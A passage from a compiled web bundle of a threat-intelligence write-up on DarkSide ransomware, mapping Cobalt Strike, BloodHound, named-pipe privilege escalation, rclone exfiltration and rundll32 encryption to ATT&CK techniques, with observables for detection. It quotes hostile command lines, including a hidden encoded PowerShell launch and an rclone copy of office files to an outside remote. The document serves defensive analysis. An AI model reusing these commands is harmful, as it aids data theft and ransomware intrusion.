RUNDLL32."),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"RUNDLL32 created ~20 instances of DLLHOST without command-line arguments."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\dllhost.exe"))))),(0,l.kt)("h4",{id:"notes-6"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"DLLHOST (a.k.a. COM Surrogate) is intented to execute DLLs."),(0,l.kt)("li",{parentName:"ul"},"DLLHOST without commmand-line arguments is suspicious.")),(0,l.kt)("h3",{id:"darkside-used-cobalt-strike-to-execute-bloodhound-in-memory-for-discovery"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"h3"},"BloodHound")," in memory for Discovery."),(0,l.kt)("h4",{id:"tactic-10"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Discovery")),(0,l.kt)("h4",{id:"techniques-10"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1071 - Application Layer Protocol"),(0,l.kt)("li",{parentName:"ul"},"T1018 - Remote System Discovery"),(0,l.kt)("li",{parentName:"ul"},"T1046 - Network Service Scanning"),(0,l.kt)("li",{parentName:"ul"},"T1560 - Archive Collected Data")),(0,l.kt)("h4",{id:"behaviors-and-observables-10"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1071"),(0,l.kt)("td",{parentName:"tr",align:null},"DLLHOST connected to default Cobalt Strike named pipe (postex_*)."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\postex_d0e7"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1018"),(0,l.kt)("td",{parentName:"tr",align:null},"DLLHOST performed multiple DNS Query events."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"DNS Queried"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"SQL03.COMPANY.COM"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1046"),(0,l.kt)("td",{parentName:"tr",align:null},"DLLHOST performed hundreds of network connections to local network"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"#{PRIVATEIP}"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1560"),(0,l.kt)("td",{parentName:"tr",align:null},"DLLHOST created json files and a zip file"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_users.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_computers.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_groups.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_ous.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_gpos.json"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\20210101190124_BloodHound.zip"))))),(0,l.kt)("h4",{id:"notes-7"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"BloodHound is an Active Directory (AD) reconnaissance tool."),(0,l.kt)("li",{parentName:"ul"},"BloodHound outputs results as JSON files"),(0,l.kt)("li",{parentName:"ul"},"BloodHound can collect information about the following objects (users, computers, groups, gpos)"),(0,l.kt)("li",{parentName:"ul"},"BloodHound can archive collected a ZIP file")),(0,l.kt)("h3",{id:"darkside-used-windows-services-to-launch-cobalt-strike-powershell-command-via-cmd-for-command-and-control"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Windows Services")," to launch ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike PowerShell")," command via ",(0,l.kt)("em",{parentName:"h3"},"CMD")," for Command And Control."),(0,l.kt)("h4",{id:"tactic-11"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command And Control")),(0,l.kt)("h4",{id:"techniques-11"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1569.002 - System Services: Service Execution"),(0,l.kt)("li",{parentName:"ul"},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,l.kt)("li",{parentName:"ul"},"T1140 - Deobfuscate/Decode Files or Information")),(0,l.kt)("h4",{id:"behaviors-and-observables-11"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002",(0,l.kt)("br",null),"T1059.001",(0,l.kt)("br",null),"T1140"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," executed highly obfuscated ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," command."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"/b /c start /b /min powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL[REDACTED]"))))),(0,l.kt)("h4",{id:"notes-8"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Command-line pattern '/b /c start /b /min powershell' used by Cobalt Strike to execute its code a service."),(0,l.kt)("li",{parentName:"ul"},"Cobalt Strike executes PowerShell command as Windows Services."),(0,l.kt)("li",{parentName:"ul"},"Command-line patter 'powershell -nop -w hidden -encodedcommand' used by Cobalt Strike to execute PowerShell encoded commands."),(0,l.kt)("li",{parentName:"ul"},"Cobalt Strike executes encoded PowerShell commands to load beacons shellcode into memory.")),(0,l.kt)("h3",{id:"darkside-used-cobalt-strike--named-pipes-impersonation-for-privilege-escalation"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Cobalt Strike"),"  Named Pipes Impersonation for Privilege Escalation."),(0,l.kt)("h4",{id:"tactic-12"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Privilege Escalation")),(0,l.kt)("h4",{id:"techniques-12"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1134 - Access Token Manipulation")),(0,l.kt)("h4",{id:"behaviors-and-observables-12"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1134"),(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation via Named Pipes Impersonation (Cobalt/Meterpreter getSystem)"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\system32\\\\cmd.exe /c echo 675f2d61c15 > \\\\\\\\.\\\\pipe\\\\526c8c"))))),(0,l.kt)("h4",{id:"notes-9"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"getSystem")," is a command for Privilege Escalation available at Cobalt Strike and Meterpreter."),(0,l.kt)("li",{parentName:"ul"},"How does it work? Meterpreter creates a Named Pipe; and creates and launch a service to run ",(0,l.kt)("em",{parentName:"li"},"cmd.exe /c echo ","[some data]"," >","\\",".\\pipe","[","random pipe here]"),". When the spawned ",(0,l.kt)("em",{parentName:"li"},"cmd.exe")," connects to Meterpreters named pipe, Meterpreter has the opportunity to impersonate that security context. Impersonation of clients is a named pipes feature. The context of the service is SYSTEM, so when you impersonate it, you become SYSTEM."),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/"},"https://www.cobaltstrike.com/blog/what-happens-when-i-type-getsystem/"))),(0,l.kt)("h3",{id:"darkside-used-rdp-to-execute-a-renamed-copy-of-rcloneexe-for-exfiltration"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"RDP")," to execute a renamed copy of ",(0,l.kt)("em",{parentName:"h3"},"rclone.exe")," for Exfiltration."),(0,l.kt)("h4",{id:"tactic-13"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Exfiltration")),(0,l.kt)("h4",{id:"techniques-13"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1036 - Masquerading"),(0,l.kt)("li",{parentName:"ul"},"T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage")),(0,l.kt)("h4",{id:"behaviors-and-observables-13"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1036"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"CMD")," created a renamed copy of rclone.exe"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\User\\\\Public\\\\nfscsvc.exe"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1567.002"),(0,l.kt)("td",{parentName:"tr",align:null},"rclone execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},'nfscsvc copy "\\\\\\\\REDACTED" ftp2:/mnt/volume_nyc1_03/loads/REDACTED --max-age 1y --stats-one-line -P --stats 2s --ignore-existing --drive-chunk-size 512M --buffer-size=4G --transfers 20 --checkers 40 --include "*.{xls,xlsx,doc,docx,pdf})'))))),(0,l.kt)("h4",{id:"notes-10"},"Notes"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Rclone is a command line program to manage files on cloud storage. Over 40 cloud storage products support rclone including S3 object stores, business & consumer file storage services, as well as standard transfer protocols (source: rclone.org)."),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("em",{parentName:"li"},"C:","\\","Users","\\","Public")," is the ",(0,l.kt)("em",{parentName:"li"},"Public")," folder in Windows. User accounts on the device have access to it. Also, network computers may have access to it, depending on network sharing settings.")),(0,l.kt)("h3",{id:"darkside-used-rundll32-to-launch-encryption-for-impact"},"DarkSide used ",(0,l.kt)("em",{parentName:"h3"},"Rundll32")," to launch encryption for Impact."),(0,l.kt)("h4",{id:"tactic-14"},"Tactic"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"Impact")),(0,l.kt)("h4",{id:"techniques-14"},"Techniques"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"T1218.011 - Signed Binary Proxy Execution: Rundll32"),(0,l.kt)("li",{parentName:"ul"},"T1486 - Data Encrypted for Impact")),(0,l.kt)("h4",{id:"behaviors-and-observables-14"},"Behaviors and Observables"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,l.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Rundll32")," ran malicious DLL"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\SysWOW64\\\\rundll32.exe c:\\\\sources\\\\solf.dll,#3 worker1 job1-11940"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"T1486"),(0,l.kt)("td",{parentName:"tr",align:null},"Created ransom notes"),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"*\\\\README.[a-z0-9]{8}.TXT"))))))}p.isMDXComponent=!0}}]);